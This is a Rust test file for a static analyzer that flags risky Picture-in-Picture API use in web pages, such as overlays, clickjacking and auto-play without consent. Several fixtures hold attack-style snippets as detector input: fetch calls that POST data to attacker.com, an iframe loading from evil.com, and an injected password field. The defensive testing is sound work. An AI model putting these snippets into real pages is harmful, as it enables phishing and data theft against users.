use crate::pip_audit::*;

#[test]
fn no_pip_no_issues() {
    assert!(analyze_pip("<html></html>").is_empty());
}

#[test]
fn detects_pip_request() {
    let body = r#"<script>video.requestPictureInPicture()</script>"#;
    let issues = analyze_pip(body);
    assert!(issues.contains(&PipIssue::PipRequested));
}

#[test]
fn detects_document_pip() {
    let body = r#"<script>documentPictureInPicture.requestWindow()</script>"#;
    let issues = analyze_pip(body);
    assert!(issues.contains(&PipIssue::DocumentPip));
}

#[test]
fn detects_auto_pip_attribute() {
    let body = r#"<video autopictureinpicture></video>"#;
    let issues = analyze_pip(body);
    assert!(issues.contains(&PipIssue::AutoPipAttribute));
}

#[test]
fn detects_pip_window_access() {
    let body = r#"<script>
        video.requestPictureInPicture();
        const pipWindow = video.pictureInPictureWindow;
    </script>"#;
    let issues = analyze_pip(body);
    assert!(issues.contains(&PipIssue::PipWindowAccess));
}

#[test]
fn detects_overlay_attack() {
    let body = r#"<script>
        const pip = await documentPictureInPicture.requestWindow();
        const el = document.createElement("div");
        pip.window.document.body.appendChild(el);
    </script>"#;
    let issues = analyze_pip(body);
    assert!(issues.contains(&PipIssue::OverlayAttack));
}

#[test]
fn detects_no_user_activation() {
    let body = r#"<script>video.requestPictureInPicture()</script>"#;
    let issues = analyze_pip(body);
    assert!(issues.contains(&PipIssue::NoUserActivation));
}

#[test]
fn no_activation_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", () => video.requestPictureInPicture());
    </script>"#;
    let issues = analyze_pip(body);
    assert!(!issues.contains(&PipIssue::NoUserActivation));
}

#[test]
fn severity_overlay_highest() {
    assert_eq!(pip_severity(&PipIssue::OverlayAttack), 6.5);
}

#[test]
fn severity_requested_lowest() {
    assert_eq!(pip_severity(&PipIssue::PipRequested), 3.0);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![PipIssue::PipRequested, PipIssue::OverlayAttack];
    let mut seq = 0;
    let ops = pip_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(PipIssue::PipRequested.to_string(), "pip_requested");
    assert_eq!(PipIssue::DocumentPip.to_string(), "document_pip");
    assert_eq!(PipIssue::AutoPipAttribute.to_string(), "auto_pip_attribute");
    assert_eq!(PipIssue::PipWindowAccess.to_string(), "pip_window_access");
    assert_eq!(PipIssue::OverlayAttack.to_string(), "overlay_attack");
    assert_eq!(PipIssue::NoUserActivation.to_string(), "no_user_activation");
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_pip("").is_empty());
}

// PipSecurityIssue tests

#[test]
fn no_pip_api_no_security_issues() {
    assert!(analyze_pip_security("<html><body>Hello</body></html>").is_empty());
}

#[test]
fn detects_pip_without_user_gesture() {
    let body = r#"<script>video.requestPictureInPicture()</script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipWithoutUserGesture));
}

#[test]
fn no_user_gesture_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", () => video.requestPictureInPicture());
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::PipWithoutUserGesture));
}

#[test]
fn no_user_gesture_issue_with_pointerdown() {
    let body = r#"<script>
        btn.addEventListener("pointerdown", () => video.requestPictureInPicture());
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::PipWithoutUserGesture));
}

#[test]
fn no_user_gesture_issue_with_touchstart() {
    let body = r#"<script>
        btn.addEventListener("touchstart", () => video.requestPictureInPicture());
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::PipWithoutUserGesture));
}

#[test]
fn no_user_gesture_issue_with_mousedown() {
    let body = r#"<script>
        btn.addEventListener("mousedown", () => video.requestPictureInPicture());
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::PipWithoutUserGesture));
}

#[test]
fn detects_document_pip_overlay() {
    let body = r#"<script>
        const pip = await documentPictureInPicture.requestWindow();
        const el = document.createElement("div");
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::DocumentPipOverlay));
}

#[test]
fn no_overlay_without_create_element() {
    let body = r#"<script>
        const pip = await documentPictureInPicture.requestWindow();
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::DocumentPipOverlay));
}

#[test]
fn detects_pip_form_spoofing_with_input() {
    let body = r#"<script>
        const pip = await documentPictureInPicture.requestWindow();
        pip.document.body.innerHTML = '<input type="password">';
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipFormSpoofing));
}

#[test]
fn detects_pip_form_spoofing_with_single_quotes() {
    let body = r#"<script>
        const pip = pictureInPictureWindow;
        pip.document.body.innerHTML = "<input type='password'>";
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipFormSpoofing));
}

#[test]
fn no_form_spoofing_without_input() {
    let body = r#"<script>
        const pip = await documentPictureInPicture.requestWindow();
        pip.document.body.innerHTML = '<div>Content</div>';
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::PipFormSpoofing));
}

#[test]
fn detects_pip_clickjacking_with_position() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        pipWindow.position = { x: 100, y: 100 };
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipClickjacking));
}

#[test]
fn detects_pip_clickjacking_with_moveto() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        pipWindow.moveTo(100, 100);
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipClickjacking));
}

#[test]
fn detects_pip_clickjacking_with_resizeto() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        pipWindow.resizeTo(320, 240);
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipClickjacking));
}

#[test]
fn no_clickjacking_without_positioning() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::PipClickjacking));
}

#[test]
fn detects_auto_pip_without_consent() {
    let body = r#"<video autopictureinpicture src="video.mp4"></video>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::AutoPipWithoutConsent));
}

#[test]
fn no_auto_pip_issue_with_user_mention() {
    let body = r#"<video autopictureinpicture src="video.mp4"></video>
    <script>
        // User consent obtained
        if (user.consentGiven) video.play();
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::AutoPipWithoutConsent));
}

#[test]
fn no_auto_pip_issue_with_consent_mention() {
    let body = r#"<video autopictureinpicture src="video.mp4"></video>
    <script>
        // Check consent before enabling
        const consent = localStorage.getItem('pipConsent');
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::AutoPipWithoutConsent));
}

#[test]
fn no_auto_pip_issue_with_permission_mention() {
    let body = r#"<video autopictureinpicture src="video.mp4"></video>
    <script>
        // Permission check
        navigator.permissions.query({name: 'picture-in-picture'});
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::AutoPipWithoutConsent));
}

#[test]
fn detects_cross_origin_pip_content() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const iframe = document.createElement('iframe');
        iframe.src = 'https://evil.com/fake.html';
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::CrossOriginPipContent));
}

#[test]
fn detects_cross_origin_pip_with_http() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const iframe = document.createElement('iframe');
        iframe.src = 'http://external.com/content.html';
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::CrossOriginPipContent));
}

#[test]
fn no_cross_origin_without_iframe() {
    let body = r#"<script>
        const pipWindow = await documentPictureInPicture.requestWindow();
        const div = document.createElement('div');
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::CrossOriginPipContent));
}

#[test]
fn detects_persistent_pip_with_setinterval() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        setInterval(() => { pipWindow.focus(); }, 1000);
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PersistentPipWindow));
}

#[test]
fn detects_persistent_pip_with_while_loop() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        while(true) { pipWindow.update(); }
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PersistentPipWindow));
}

#[test]
fn detects_persistent_pip_with_infinite_for() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        for(;;) { pipWindow.render(); }
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PersistentPipWindow));
}

#[test]
fn no_persistent_pip_without_loops() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        pipWindow.focus();
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::PersistentPipWindow));
}

#[test]
fn detects_pip_data_exfiltration_with_fetch() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipDataExfiltration));
}

#[test]
fn detects_pip_data_exfiltration_with_xhr() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        const xhr = new XMLHttpRequest();
        xhr.open('POST', '/exfil');
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipDataExfiltration));
}

#[test]
fn detects_pip_data_exfiltration_with_beacon() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        navigator.sendBeacon('/analytics', data);
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipDataExfiltration));
}

#[test]
fn no_data_exfiltration_without_network_calls() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        console.log(data);
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::PipDataExfiltration));
}

#[test]
fn detects_pip_resize_manipulation() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        pipWindow.resize(1, 1);
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipResizeManipulation));
}

#[test]
fn detects_pip_resize_with_width_height() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        pipWindow.width = 1;
        pipWindow.height = 1;
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipResizeManipulation));
}

#[test]
fn no_resize_manipulation_without_size_changes() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::PipResizeManipulation));
}

#[test]
fn detects_media_session_hijacking() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        navigator.mediaSession.setActionHandler('play', () => {});
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::MediaSessionHijacking));
}

#[test]
fn detects_media_session_hijacking_with_metadata() {
    let body = r#"<script>
        const pipWindow = video.pictureInPictureWindow;
        navigator.mediaSession.metadata = new MediaMetadata({
            title: 'Fake Title'
        });
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::MediaSessionHijacking));
}

#[test]
fn no_media_session_hijacking_without_pip() {
    let body = r#"<script>
        navigator.mediaSession.setActionHandler('play', () => {});
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(!issues.contains(&PipSecurityIssue::MediaSessionHijacking));
}

#[test]
fn pip_security_display_variants() {
    assert_eq!(
        PipSecurityIssue::PipWithoutUserGesture.to_string(),
        "pip_without_user_gesture"
    );
    assert_eq!(
        PipSecurityIssue::DocumentPipOverlay.to_string(),
        "document_pip_overlay"
    );
    assert_eq!(
        PipSecurityIssue::PipFormSpoofing.to_string(),
        "pip_form_spoofing"
    );
    assert_eq!(
        PipSecurityIssue::PipClickjacking.to_string(),
        "pip_clickjacking"
    );
    assert_eq!(
        PipSecurityIssue::AutoPipWithoutConsent.to_string(),
        "auto_pip_without_consent"
    );
    assert_eq!(
        PipSecurityIssue::CrossOriginPipContent.to_string(),
        "cross_origin_pip_content"
    );
    assert_eq!(
        PipSecurityIssue::PersistentPipWindow.to_string(),
        "persistent_pip_window"
    );
    assert_eq!(
        PipSecurityIssue::PipDataExfiltration.to_string(),
        "pip_data_exfiltration"
    );
    assert_eq!(
        PipSecurityIssue::PipResizeManipulation.to_string(),
        "pip_resize_manipulation"
    );
    assert_eq!(
        PipSecurityIssue::MediaSessionHijacking.to_string(),
        "media_session_hijacking"
    );
}

#[test]
fn pip_security_severity_form_spoofing_highest() {
    assert_eq!(
        pip_security_severity(&PipSecurityIssue::PipFormSpoofing),
        8.5
    );
}

#[test]
fn pip_security_severity_persistent_window_lowest() {
    assert_eq!(
        pip_security_severity(&PipSecurityIssue::PersistentPipWindow),
        3.5
    );
}

#[test]
fn pip_security_severity_data_exfiltration() {
    assert_eq!(
        pip_security_severity(&PipSecurityIssue::PipDataExfiltration),
        7.5
    );
}

#[test]
fn pip_security_severity_clickjacking() {
    assert_eq!(
        pip_security_severity(&PipSecurityIssue::PipClickjacking),
        6.5
    );
}

#[test]
fn pip_security_to_operations_creates_entries() {
    let issues = vec![
        PipSecurityIssue::PipFormSpoofing,
        PipSecurityIssue::PipDataExfiltration,
    ];
    let mut seq = 0;
    let ops = pip_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn pip_security_empty_issues_empty_operations() {
    let issues: Vec<PipSecurityIssue> = Vec::new();
    let mut seq = 0;
    let ops = pip_security_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 0);
}

#[test]
fn multiple_security_issues_detected() {
    let body = r#"<script>
        video.requestPictureInPicture();
        const pipWindow = video.pictureInPictureWindow;
        pipWindow.resize(1, 1);
        fetch('https://attacker.com/data', { method: 'POST' });
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.contains(&PipSecurityIssue::PipWithoutUserGesture));
    assert!(issues.contains(&PipSecurityIssue::PipResizeManipulation));
    assert!(issues.contains(&PipSecurityIssue::PipDataExfiltration));
}

#[test]
fn guard_no_pip_api_prevents_false_positives() {
    let body = r#"<script>
        // No PiP API present
        fetch('https://example.com/data');
        const width = 100;
        const height = 100;
    </script>"#;
    let issues = analyze_pip_security(body);
    assert!(issues.is_empty());
}

#[test]
fn pip_element_attribute_triggers_guard() {
    let body = r#"<script>
        if (document.pictureInPictureElement) {
            console.log("PiP active");
        }
    </script>"#;
    let issues = analyze_pip_security(body);
    // Should not be empty because guard detects pictureInPictureElement
    // But no specific issues match, so should be empty
    assert!(issues.is_empty());
}

#[test]
fn edge_case_empty_string() {
    assert!(analyze_pip_security("").is_empty());
}

#[test]
fn edge_case_whitespace_only() {
    assert!(analyze_pip_security("   \n\t  ").is_empty());
}

#[test]
fn edge_case_pip_api_in_comment() {
    let body = r#"<script>
        // video.requestPictureInPicture();
        console.log("No actual PiP");
    </script>"#;
    let issues = analyze_pip_security(body);
    // Static analysis detects the string even in comments — expected
    assert!(issues.contains(&PipSecurityIssue::PipWithoutUserGesture));
}
